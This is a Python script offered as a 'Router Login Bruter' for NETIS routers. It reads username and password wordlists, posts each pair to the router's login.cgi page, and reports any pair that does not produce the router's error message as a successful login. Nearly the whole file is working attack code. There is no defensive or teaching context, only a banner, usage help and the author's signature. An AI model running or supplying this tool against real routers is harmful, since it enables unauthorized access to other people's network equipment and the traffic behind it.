#!/usr/bin/python3

from requests import post,get
from sys import argv
from termcolor import cprint

def help():
	print(f"""Usage: python3 {argv[0]} <Router_IP> <Router_Name> <Username_File> <Password_File> OR <Username_and_Password_File_Separated_By_':'>
Example: python3 {argv[0]} 192.168.1.1 NETIS Wordlist\n
	-h, --help						   Show this help message.
	<Router_IP>						   IP Address of the Router.
	<Router_Name>                                              NETIS's available now, maybe I'll add a new names in the future.
	<Username_File>                                            Username's Wordlist.
	<Password_File>                                            Password's Wordlist.
	<Username_and_Password_File_Separated_By_':'>              Username and Password Wordlist separated by ':', Example: admin:admin.\n""")

def Banner():
	cprint("""
_______            ______   _______              ________
__  __ \           __<  /   ___    |____________ ___  __/_____ _
_  / / /           __  /    __  /| |_  ___/  __ `/_  /_ _  __ `/
/ /_/ /  ___       _  /     _  ___ |  /   / /_/ /_  __/ / /_/ /
\____/   _(_)      /_/      /_/  |_/_/    \__,_/ /_/    \__,_/""","magenta",attrs=["bold"],end="")
	cprint("""\n
________             _____            ______               _____                        ________              _____
___  __ \_________  ___  /_______________  / _____________ ___(_)______                 ___  __ )__________  ___  /_____________
__  /_/ /  __ \  / / /  __/  _ \_  ___/_  /  _  __ \_  __ `/_  /__  __ \   ________     __  __  |_  ___/  / / /  __/  _ \_  ___/
_  _, _// /_/ / /_/ // /_ /  __/  /   _  /___/ /_/ /  /_/ /_  / _  / / /   _/_____/     _  /_/ /_  /   / /_/ // /_ /  __/  /
/_/ |_| \____/\__,_/ \__/ \___//_/    /_____/\____/_\__, / /_/  /_/ /_/                 /_____/ /_/    \__,_/ \__/ \___//_/
                                                   /____/
""","magenta",attrs=["bold"],end=""),cprint("                                                                       Coded By: ","blue",attrs=["bold"],end=""),cprint("Abd Almoen Arafa (0.1Arafa)\n","green",end=""),cprint("                                                                       MyAge is: ","blue",attrs=["bold"],end=""),cprint("16\n","green")

def First_Packet():
	try:	get("http://"+argv[1],timeout=5)
	except:	cprint("Error: Invalid IP Address.","red",attrs=["bold"]),exit()

def Error():	cprint("Usage: ","white",attrs=["bold"],end=""),cprint("python3 "+argv[0]+" <Router_IP> <Router_Name> <Username_File> <Password_File> OR <Username_and_Password_File_Separated_By_':'>","green",attrs=["bold"]),cprint("Example: ","white",attrs=["bold"],end=""),cprint(f"python3 {argv[0]} 192.168.1.1 NETIS Wordlist","green",attrs=["bold"]),cprint("Use ","white",attrs=["bold"],end=""),cprint("-h","green",attrs=["bold"],end=""),cprint(", ","white",attrs=["bold"],end=""),cprint("--help","green",attrs=["bold"],end=""),cprint(" To Show Help Message.\n","white",attrs=["bold"]),exit()

def Netis():
	if argv[1].lower() == "--help" or argv[1].lower() == "-h":	Error()
	Banner()
	url="http://"+argv[1]+"/login.cgi"
	count=1
	if len(argv) == 4:
		First_Packet()
		try:
			File1=open(argv[3],"r",encoding='latin-1')
		except:	cprint("Error: File not found.","red",attrs=["bold"]),exit()
		for line in File1.readlines():
			all=line.strip().split(":")
			try:
				Username=all[0]
				Password=all[1]
			except IndexError:	cprint("Error: Username and Password must separate by ':', example: admin:admin.","red",attrs=["bold"]),exit()
			try:	r=post(url, data=f"username={Username}&password={Password}&submit.htm")
			except KeyboardInterrupt:	cprint("Stopped by the user.","yellow","on_red",attrs=["bold"]),exit()
			except:	cprint("Error: Unknown Error, makesure that there's no empty line.","red",attrs=["bold"]),exit()
			if "Username or password error, try again!" in str(r.content):	cprint("[","red",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {Username}:{Password}.","grey",attrs=["bold"])
			else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[","green",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {Username}:{Password}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
			count+=1
		cprint("[","yellow",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","yellow",attrs=["bold"],end=" "),cprint("Finished without any results.","cyan",attrs=["bold"])
	elif len(argv) == 5:
		First_Packet()
		try:
			file1=open(argv[3],"r",encoding='latin-1')
			file2=open(argv[4],"r",encoding='latin-1')
		except:	cprint("Error: File not found.","red",attrs=["bold"]),exit()
		for Line1,Line2 in zip(file1.readlines(),file2.readlines()):
			UsernamE=Line1.strip()
			PassworD=Line2.strip()
			try:	R=post(url, data=f"username={UsernamE}&password={PassworD}&submit.htm")
			except KeyboardInterrupt:	cprint("Stopped by the user.","yellow","on_red",attrs=["bold"]),exit()
			except: cprint("Error: Unknown Error, makesure that there's no empty line.","red",attrs=["bold"]),exit()
			if "Username or password error, try again!" in str(R.content):	cprint("[","red",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {UsernamE}:{PassworD}.","grey",attrs=["bold"])
			else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[","green",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {UsernamE}:{PassworD}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
			count+=1
		cprint("[","yellow",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","yellow",attrs=["bold"],end=" "),cprint("Finished without any results.","cyan",attrs=["bold"])
	else:	Error()

if __name__ == "__main__":
	if len(argv) == 2 and argv[1].lower() == "--help" or len(argv) == 2 and argv[1].lower() == "-h":	Banner(),help()
	elif len(argv) == 4 or len(argv) == 5 and argv[2].lower() == "netis":	Netis()
	else:	Error()

#Made By: Abd Almoen Arafa (0.1Arafa)
#Age: 16
